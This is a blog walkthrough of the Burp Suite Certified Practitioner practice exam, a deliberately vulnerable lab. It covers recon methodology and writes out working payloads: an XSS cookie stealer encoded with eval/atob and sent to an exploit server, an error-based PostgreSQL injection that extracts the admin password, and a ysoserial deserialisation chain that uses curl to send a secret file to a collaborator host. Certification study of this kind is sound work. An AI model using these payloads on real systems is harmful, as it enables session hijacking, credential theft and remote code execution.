<h2>Burp Suite Certified Practitioner Practice Exam Walkthrough</h2>
<h3> 16th September 2023</h3>

<hr>

<p>It's certainly been a while since I wrote one of these. I have gone through a number of places of work,
    have found some interesting vulnerabilities in both government and private companies, and have continued to work at
    improving what I do.</p>
<p>A core area I wish I'd been better at when I had a role titled Penetration Tester is Web Application Security. There
    are many places to
    learn about this, and many more to perfect your craft. I'll include a list of what I would consider to be great
    places to look into. For now
    though I want to focus on the Burp Suite Certified Practitioner (BSCP) certification, specifically around walking
    through the practice exam and detailing
    my methodology for going through it.
</p>
<p>More information on the BSCP can be found over at Portswigger's website at <a
        href="https://portswigger.net/web-security/certification">portswigger.net/web-security/certification</a>
    . What makes the BSCP such a fantastic certification to work towards is how practical it is. There is no write-up,
    nor is there a set of theoretical
    questions. Nay, instead the BCSP works by providing you with a set of vulnerable web applications that have bugs
    related to the hundreds of labs
    in their Web Security Academy. Having done over half of the academy myself I feel poised to offer advice on how to
    run through this practice exam and show my thinking.</p>

<h3>Initial Enumeration and First Bug</h2>

    <p>We start by firing up the practice exam located at <a
            href="https://portswigger.net/web-security/certification/takepracticeexam/1">the BSCP practice exam
            portal</a> (You will need to be logged in, it's free to make an account)</p>

    <p>Once here, we will move onto starting the exam and dropping into the application.</p>

    <img src="../images/bcsp_first_step_practice_exam.jpg">

    <p>Now there is a number of ways to look at the application initially however a good methodology for initial recon
        is:</p>
    <ul>
        <li>Browse through the application and click and run all the things</li>
        <li>Run a spider and a Burp <i>Crawl and Audit</i> scan</li>
        <li>View the page source</li>
        <li>Put the DOM-Invader canary in all the input fields</li>
        <li>Look for weird cookies/services/etc</li>
        <li>Run the network tab on your browser dev tools and check for things loaded in</li>
        <li>Check the headers</li>
        <li>Test for special characters and injection tests like a xss polyglot</li>
    </ul>

    <p>Now that you have done all of those things, you will have noticed the scanner and DOM invader has detected an
        unsafe XSS sink with <code>location.search</code></p>
    <img src="../images/bcsp_detected_unsafe_sink.jpg">
    <img src="../images/bcsp_detected_unsafe_sink2.jpg.png">

    <p>That's interesting... Well then, after a bit of mangling, and injecting into the searchResultsObj payload, we
        notice that
        <code>"+alert(1)}//</code> can be used to inject an alert box into the javascript in a reflected XSS attack.
        Next we need to find out how to weaponise it with a cookie stealer sent through the Exploit Server to hopefully
        exploit a low level user.
    </p>

    <img src="../images/bscp_xss1.jpg">

    <p>We start by trying document.cookie to alert a cookie. We also set a cookie manually in our browser with Dev Tools
        to poc this. If your tried <code>"+alert(document.cookie)}//</code> you will get <b>"Potentially dangerous
            search term"</b>. In fact, upon inspecting the input behaviour, you'll notice that a single full stop
        character will cause this error. So we will have to find out how to craft an exploit that does not require this
        character.</p>

    <p>A great resource that will help us here is Portswigger's XXS Cheat Sheet, specifically the <a
            href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-string-concatenation-window">WAF
            bypass global objects</a> that show off the potential to inject <code>['doc'+'ument']['dom'+'ain']</code> or
        in our case, <code>['document']['cookie']</code>. Plugging this into the payload we find
        <code>"+alert(this['document']['cookie'])}//</code> to work, producing us a cookie.
    </p>

    <img src="../images/bscp_xss_cookie.jpg">

    <p>Now we need to make this reach out to our exploit server to leak the cookie. We first run the window.location
        using our method to the exploit server URL, and then append to a URL parameter the cookie to catch this in the
        logs.</p>

    <p>As the URL will most likely have full stops, we will need to be creative with our payload encoding. We can use
        the eval() and atob() to accomplish this.</p>

    <p>Using an online base64 encoder, we convert
        <code>window["document"]["location"]="https://exploit-0a3e004e03e5345c809c16c3012800d2.exploit-server.net/e?="+window["document"]["cookie"]</code>
        to the base64 equivalent of
        <code>d2luZG93WyJkb2N1bWVudCJdWyJsb2NhdGlvbiJdPSJodHRwczovL2V4cGxvaXQtMGEzZTAwNGUwM2U1MzQ1YzgwOWMxNmMzMDEyODAwZDIuZXhwbG9pdC1zZXJ2ZXIubmV0L2U/PSIrd2luZG93WyJkb2N1bWVudCJdWyJjb29raWUiXQ==</code>
        and then we run this through a <code>eval(atob(PAYLOAD))</code> to get things working, testing this payload out
        on us we find it works. With the final payload being
        <code>"+eval(atob("d2luZG93WyJkb2N1bWVudCJdWyJsb2NhdGlvbiJdPSJodHRwczovL2V4cGxvaXQtMGEzZTAwNGUwM2U1MzQ1YzgwOWMxNmMzMDEyODAwZDIuZXhwbG9pdC1zZXJ2ZXIubmV0L2U/PSIrd2luZG93WyJkb2N1bWVudCJdWyJjb29raWUiXQ=="))}//</code>
    </p>

    <img src="../images/bscp_xss_leak_to_exploit_server.jpg">


    <p> Now we just need to fire this off to the victim with a simple
        <code>&lt;script&gt;location=PAYLOAD&lt;/script&gt;</code> </p>

    <img src="../images/bscp_xss_exploit.jpg">
    <img src="../images/bscp_victims_session_cookie.jpg">

    <p>Now we add our cookie as this persons and wow, just like that we are now Carlos! We can even view their password
        by mixing the html up a bit on the My Account page</p>

    <img src="../images/bscp_carlos.jpg">

    <h3>Going deeper and SQLi on Authenticated Advance Search</h2>
        <p>So now we would go about doing the whole cycle of enumeration again. As time is limited, especially on the
            exam, we have to be strategic about things. When we are unlocked into the Carlos account, we have a new
            feature unlocked which is the <i>/advanced_search</i> panel. Due to this, we will perform an active scan of
            this, showing us that this is vulnerable to SQL injection.</p>

        <img src="../images/bscp_sqli_identified.jpg">

        <p>What's more, we even get a bit of output showing how the SQL statement is constructed with the output
            <code>Unterminated string literal started at position 33 in SQL SELECT * FROM posts ORDER BY DATE'. Expected
                char</code></p>

        <p>Now to exploit this, we run through test inputs with the <a
                href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Portswigger SQL Injection Cheat
                Sheet</a> and find that appending <code>;SELECT+pg_sleep(10)</code> gives us a ten second delay. This
            shows that the exploit will most likely be a blind SQLi against PostgreSQL.</p>

        <img src="../images/bcsp_sqli_injection.jpg">

        <p>With this information we then go through the SQLi Cheat Sheet and look for the applicable vector to help us
            retrieve information from the database. This could be UNION based, error-based, blind, or even Out-Of-Band
            using something like the burp collaborator.</p>

        <p> In our case, the fact we got error messaging in the error above should be an indicator that we might not be
            blind, and that we could actually use this. In our case since we know that this is PostgreSQL, and we could
            test for error-based, the area in the cheat sheet <b>Extracting data via visible error messages</b> was just
            what we needed. Usually the root account password is the first account in the database, however the fact
            this is the case here and the fact that the database was called <i>users</i>, and the table was called
            <i>password</i> was one of luck.</p>

        <p> The final payload for this without URL-encoding is <code>;SELECT CAST((SELECT password FROM users LIMIT 1)
                AS int)--</code></p>

        <img src="../images/bcsp_sqli_admin_pwn.jpg">

        <p>From here, this unlocks only one other piece of functionality on the web application... the Admin panel</p>

        <h3>Final exploitation from Admin to Webserver pwn</h2>

            <p>Okay so now we have the administrator panel and are introduced to two interesting potential vectors
                being:</p>
            <ul>
                <li>The delete user functionality (tried a delete action with a non-existent user via proxy)</li>
                <li>The very long admin-prefs cookie which URL-decoded is a Base64 piece of gibberish</li>
            </ul>

            <img src="../images/bcsp_admin_interesting_functionality.jpg">

            <p>The later one is something that appears to be a lot like deserialisation. We will run this again through
                a customized scan that expressly forbids the calling of the delete action. We do this by adding a
                scanning configuration in which only Cookie parameter values are looked at.</p>

            <p>Now... we could wait for the scan to complete however an interesting thing to look at is that decoding
                the cookie from base64, we get a hexadecimal representation of the first three bytes being <code>1f 8b
                    08</code> which is indicative of a GZip compression. This is building up the case of deserialisation
                as the vector.</p>

            <p>To begin, we send the following payload with the cookie to the Deserialisation Scanner, and run some
                manual testing. As we are aware of the gzip, base64, and URL encoding, we set the manual testing with
                the cookie as an insertion point and working back to front we have:</p>
            <ul>
                <li>Compress using gzip</li>
                <li>Encode using base64</li>
                <li>Encode using URL encoding</li>
            </ul>

            <p>Running multiple tests, <i>Sleep</i> does nothing however <i>DNS (vuln libraries)</i> detected that this
                might be potentially be vulnerable to the <i>Apache Commons Collections 3</i>. It should be noted that I
                also had an issue where I was running Java 17, however this will mess things up past using the scanner
                and manual, In my case I do the second part in my Windows Subsystem for Linux with generating this
                manually, gzipping, and base64 encoding. For more information on this please refer to <a
                    href="https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f">https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f</a>
            </p>

            <img src="../images/bscp_deserial_detect_common_collection.jpg">

            <p>Now despite that saying <i>Commons Collections 3, Alternate Payload 3</i>, this is actually
                CommonsCollection6 in ysoserial (different from Deserialization Scanner). This mess can be attributed to
                the following git issue <a
                    href="https://github.com/federicodotta/Java-Deserialization-Scanner/issues/35">https://github.com/federicodotta/Java-Deserialization-Scanner/issues/35</a>
            </p>

            <p>Additionally, due to the issues around the aforementioned issues with the java versions specified, I
                utilised piping as shown by the PayloadAllTheThings resource, which I piped out to gzip and base64,
                before reattaching in the vulnerable cookie parameter and URL encoding the key characters there. As you
                can see the command format is: <code>java -jar ysoserial-all.jar CommonsCollections6 'dig
                    {BURP_COLLABORATOR_URL}' | gzip | base64 -w 0</code> with that <code>-w 0</code> set so it prints
                out on a single line to we don't have any Linux Carriage Return, Line Endings (CR/LE) issues.</p>

            <img src="../images/bscp_deserialisation_achieved.jpg">

            <p>So at this point we need to leak out the information in /home/carlos/secret which we'd find after
                enumerating the system with the foothold we now have with Out of Band Code Execution.</p>

            <p>Modifying this around until it works , the command piped in being <code>curl --data @/home/carlos/secret
                    {BURP_COLLABORATOR_URL}</code> worked. And with that, the solution is found, and with that. The
                practice exam is completed.</p>
